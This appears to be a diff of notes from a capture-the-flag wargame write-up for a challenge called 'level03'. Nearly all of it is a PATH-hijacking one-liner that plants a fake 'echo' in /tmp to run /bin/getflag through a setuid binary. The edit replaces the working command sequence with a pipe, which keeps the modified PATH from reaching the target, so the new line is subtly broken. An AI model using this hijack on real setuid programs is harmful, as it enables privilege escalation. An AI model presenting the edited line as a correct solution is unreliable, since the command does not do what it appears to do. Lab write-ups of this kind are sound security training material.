@@ -35,5 +35,5 @@ https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code
 
 so
 
-echo '/bin/getflag' >> /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp/ ; ./level03
+echo '/bin/getflag' >> /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games | ./level03
 
